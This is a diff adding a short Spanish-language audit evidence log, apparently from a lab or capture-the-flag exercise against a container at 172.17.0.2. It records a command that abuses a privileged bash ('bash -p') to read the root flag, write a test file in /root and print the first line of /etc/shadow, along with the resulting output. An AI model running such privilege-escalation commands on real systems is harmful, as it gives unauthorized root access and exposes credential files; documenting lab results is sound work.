@@ -1,0 +1,16 @@
+================================================================
+ ACME Corp — Evidencia de auditoría
+ Fecha (UTC) : 2026-10-18T04:09:22Z
+ Objetivo    : 172.17.0.2
+ Fase        : Vector A — Lectura de la bandera root y prueba de escritura
+ Comando     : echo '--- lectura de /root/root.txt ---'; /usr/bin/bash -p -c 'cat /root/root.txt'; echo; echo '--- escritura en /root ---'; /usr/bin/bash -p -c 'echo prueba > /root/.audit_canary && echo "WRITE TO /root: OK" && rm -f /root/.audit_canary'; echo; echo '--- lectura de /etc/shadow ---'; /usr/bin/bash -p -c 'head -1 /etc/shadow'
+================================================================
+
+--- lectura de /root/root.txt ---
+FLAG{wp2shell_cve_2026_63030_core_rce_root_99d10c8b}
+
+--- escritura en /root ---
+WRITE TO /root: OK
+
+--- lectura de /etc/shadow ---
+root:*:20675:0:99999:7:::
